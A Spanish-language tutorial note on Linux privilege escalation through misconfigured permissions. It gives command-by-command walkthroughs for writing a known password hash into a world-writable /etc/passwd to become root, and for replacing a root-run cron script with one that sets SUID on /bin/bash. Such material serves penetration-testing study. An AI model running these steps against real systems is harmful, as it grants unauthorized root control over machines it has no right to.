# Abuso de permisos incorrectamente implementados

Tags: #Linux #PermisosIncorrectos  #Escalada #Root #Privilegios

En sistemas Linux, los archivos y directorios tienen permisos que se utilizan para controlar el acceso a ellos. Los permisos se dividen en tres categorías: propietario, grupo y otros. Cada categoría puede tener permisos de lectura, escritura y ejecución. Los permisos de un archivo pueden ser modificados por el propietario o por el superusuario del sistema.

El abuso de permisos incorrectamente implementados ocurre cuando los permisos de un archivo crítico son configurados incorrectamente, permitiendo a un usuario no autorizado acceder o modificar el archivo. Esto puede permitir a un atacante leer información confidencial, modificar archivos importantes, ejecutar comandos maliciosos o incluso obtener acceso de superusuario al sistema.

De esta forma, un atacante experimentado podría aprovecharse de esta falla para elevar sus privilegios en el mejor de los casos. Una de las herramientas encargadas de aplicar este reconocimiento en el sistema es ‘**lse**‘. Linux Smart Enumeration (LSE) es una herramienta de enumeración de seguridad para sistemas operativos basados en Linux, diseñada para ayudar a los administradores de sistemas y auditores de seguridad a identificar y evaluar vulnerabilidades y debilidades en la configuración del sistema.

LSE está diseñado para ser fácil de usar y proporciona una salida clara y legible para facilitar la identificación de problemas de seguridad. La herramienta utiliza comandos de Linux estándar y se ejecuta en la línea de comandos, lo que significa que no se requiere software adicional. Además, enumera una amplia gama de información del sistema, incluyendo usuarios, grupos, servicios, puertos abiertos, tareas programadas, permisos de archivos, variables de entorno y configuraciones del firewall, entre otros.

A continuación, se os proporciona el enlace directo al proyecto de GitHub correspondiente a esta herramienta:

- **Linux Smart Enumeration**: [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)


## Permisos incorrectos

```bash 
❯ find / -writable 2>/dev/null | grep -vE "python3.10|proc"          # Podemos encontrar archivos que tengan capacidad de escritura
```

```bash
-rw-r--rw- 1 root root 8756 Feb 7 2022 /etc/passwd                   # Podemos encontrar que el /etc/passwd tiene los permisos mal implementados
```

Para este tipo de escalada:
* Primero debemos de ver que otros puedan  modificar el archivo /etc/passwd
* Después debemos de meter una passwd hardcodeada en la parte de **X** en root, en un formato hash correspondiente.

```python 
❯ cat /etc/passwd

root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```

Las passwd las lee del archivo que esta en el **/etc/shadow** 
Pero para este tipo de escalada lo que haremos será que no le daremos la oportunidad de que al momento de poner la passwd la lea del shadow. Y que la passwd que lea será la que esta en el **/etc/passwd** haciéndola que la tome como prioritaria y así nosotros la podamos colocar.

```bash 
❯ openssl passwd                # Esta herramienta nos permite que para una palabra dada me genere un hash que es la propia passwd pero en un formato que el /etc/passwd logra interpretar, ya que por defecto no podemos colocar la passwd en texto claro
```

Después modificamos el **/etc/passwd** y agregamos el hash que nos arrojo la herramienta anterior. 

```python 
❯ nvim /etc/passwd

root:$1$MEkVfoo5$2ubSWdbi0QZcUuY6VkUBY.:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```

Una vez modificado migramos al usuario root
```bash 
❯ su root                       # Cambiamos de usuario e ingresamos la palabra que utilizamos en la herramienta de openssl y la tomara como correcta porque la compara con el /etc/passwd
```

* También, podemos usar la herramienta de **lse.sh** o **LinPeas**

* Caso 2:
Cuando tenemos un archivo en nuestro dir que se esta ejecutando cada cierto tiempo y quien lo ejecuta es root. Tareas CRON 
```bash 
-rwxr-xr-x 1 root root 8756 Feb 7 2022 example.sh                   # Miramos sus privilegios y nos damos cuenta que no lo podemos modificar 
```

Pero como este archivo se encuentra en nuestro dir, lo que haríamos seria eliminarlo. 

```bash 
❯ rm example.sh                  # Eliminamos el archivo y despues nos creamos uno con el contenido que querramos que ejecute, claro con el mismo nombre del anterior
❯ nvim example.sh                
❯ chmod +x exmaple.sh 

# Le agregamos el contenido que queremos que se ejecute 
#!/bin/bash 
chmod u+s /bin/bash             # Haremos que cuando se ejecute nos otorgue un permiso SUID a la bash 
```

```bash 
❯ watch -n 1 ls -l /bin/bash                                       # Miramos cada seg el privilegio del /bin/bash
-rwsr-xr-x 1 root root 8756 Feb 7 2022 /bin/bash                   # Miramos como ya tiene permisos SUID
```

